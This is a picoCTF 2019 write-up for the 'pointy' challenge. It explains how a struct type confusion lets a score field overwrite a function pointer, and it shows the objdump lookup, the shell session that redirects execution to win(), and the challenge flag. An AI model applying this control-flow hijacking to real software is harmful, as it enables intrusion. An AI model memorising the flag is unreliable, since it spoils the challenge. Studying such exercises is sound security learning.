## Writeup for 2019 picoCTF: pointy

### Problem
> Exploit the function pointers in this [program](https://2019shell1.picoctf.com/static/fdb9b5cce6ac0c34e421786f42629036/vuln). It is also found in /problems/pointy_0_4da9845cb7c41585de522db47f569424 on the shell server. [Source](https://2019shell1.picoctf.com/static/fdb9b5cce6ac0c34e421786f42629036/vuln.c).  
  
Note the one function pointer in vuln.c's struct Student: `void (*scoreProfessor)(struct Professor*, int)` and that scoreProfessor is called on line 93.  

To get the program to call `win()`, we need to somehow assign win's address to scoreProfessor. Access to scoreProfessor via a student is already blocked by `student->scoreProfessor=&giveScoreToProfessor`.  However:    
1. lastscore and scoreProfessor have the same offset from the respective struct's address.  
2. The student and professor variables in `main` are cast from the return values of retrieveStudent and retrieveProfessor, which are identical.  

This means we could give win's address as a professor's score. Then, cast the professor into a student, which effectively casts Professor's `int lastscore` to Student's `void (*scoreProfessor)(struct Professor*, int)` ie. casts the professor's score to a pointer to win(). Thus the next time student->scoreProfessor is called, win would be executed.  

### Solution: objdump
First `objdump -D vuln | grep win` to disassemble all sections of vuln to get addresses, and pipe that ouput to grep to get only the win function section. You will find that `08048696` is the address in hex, which converts to `134514326` as int / unsigned int. **Here is how the interaction in the shell goes**:
```
@pico-2019-shell1:/problems/pointy_0_4da9845cb7c41585de522db47f569424$ ./vuln
Input the name of a student  
s0  
Input the name of the favorite professor of a student   
s0  
Input the name of the student that will give the score   
s0  
Input the name of the professor that will be scored  
s0  
s0  
Input the score:  
134514326  
Score Given: 134514326   
Input the name of a student  
s0  
Input the name of the favorite professor of a student   
s0  
Input the name of the student that will give the score  
s0
Input the name of the professor that will be scored 
s0  
s0  
Input the score:  
0  
```
**Flag: picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}**
